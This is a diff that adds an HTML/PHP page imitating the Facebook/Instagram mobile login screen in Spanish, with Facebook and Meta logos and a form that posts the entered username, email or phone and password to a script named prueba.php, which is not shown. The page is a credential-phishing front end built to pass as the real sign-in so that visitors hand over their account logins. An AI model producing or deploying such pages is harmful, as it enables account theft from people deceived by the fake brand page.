@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>                          
+<meta charset="UTF-8">                               <meta name="viewport" content="width=device-width, initial-scale=1.0">                                    
+<title>instagram</title>                              <link rel="stylesheet" type="text/css" href="stylos.css">                                              
+</head>
+<body>
+
+<div class="fcontainer">
+        <div id="header">
+		
+		
+		
+                <img src="1766042963567.png" class="Tutu" width="25px"  > 
+<span>Get Facebook for Android and browse faster.</span>                                                       </div>
+
+
+
+	<section class="base1">
+		<p  class="parrafo">Español (MX)</p>
+<img src="Facebook24.png" alt="" class="foto24">
+
+</section>
+
+<form action="prueba.php" name="instagram" method="post">
+
+<div id="fbox">
+
+	<input type="text" id="text" name="email" placeholder="Nombre de usuario, correo o celular">                                                                <input type="text" id="password" name="password" placeholder="Contraseña">
+
+	<input type="submit" value="Iniciar sesión" name="login" id="login_button">
+
+	<span class="passwd">¿Olvidaste tu contraseña?</span>
+
+<input type="submit" value="Crear cuenta nueva" id="cuenta" name="cuenta">
+
+
+	<div class="insta24">
+        <div id="footer">                                            <img src="meta.png" width="65px">   
+
+<?php
+include("prueba.php");
+?>
+	</div>
+	</div>
+	</div>
+
+</div>
+</form>
+</body>
+
+</html>
+
+<style>
+
+*{                                                                                                        box-sizing: border-box;                              margin: 0;                                           padding: 0;   
+}
+
+
+
+#header {                                            width:100%;                                          display:flex;                                        align-items:center;
+padding: 12px;
+font-size:12px;
+color: #4285F4;
+font-family: 'Roboto', sans-serif;
+}
+
+.base1 {
+display: flex;   
+flex-wrap: wrap;
+justify-content: center;                             align-items: center;
+
+}
+
+ .parrafo {
+font-weight:bold;
+color: #000000;                                      width: 100%;                                         text-align: center;                                  margin-top: 20px;                                    margin-bottom: 10px;
+font-size:12px;
+ }
+
+ .foto24 {
+margin-top: 50px;    
+margin-bottom: 80px;
+width:  60px;                                       
+height: 60px;    
+}
+
+
+#fbox{                                                       width:100%;                                          display:flex;                                        align-items:center;                                  justify-content:center;                              flex-direction: column;                      }
+
+#fbox input{                                                 width:92%;                                           margin-top:12px;                                      padding:20px;                                        border:none;                                         outline:none;                                        background: #FFFFF;   
+	border: 0.5px solid;
+	border-radius: 12px;                           }
+
+#fbox #login_button {
+padding:12px;
+border-radius: 20px;
+font-size:14px;                                      font-weight:bold;                                    color:#fff;                                          background:#4285F4;                                  border:none;                                         outline:none;
+
+}
+
+
+#fbox #cuenta {
+padding:12px;                                        border-radius: 20px;                                 font-size:14px;                                      font-weight:bold;                                    color: #4285F4;                                      background:#ffffff;                                  border-radius: 1px solid;                            outline:none;
+margin-top: 98px;
+border-width: 1.2px;
+
+}
+
+.passwd {
+font-size:12px;
+color: #000;                                      
+width: 100%;                                         text-align: center;                                  margin-top: 20px;                                    margin-bottom: 10px;
+font-weight: bold ;
+
+}
+
+#footer  {
+margin-top: 20px;
+width: 100%;                                          display:flex;                                        align-items:center;                                  font-weight: bold;
+}
+
+</style>
+
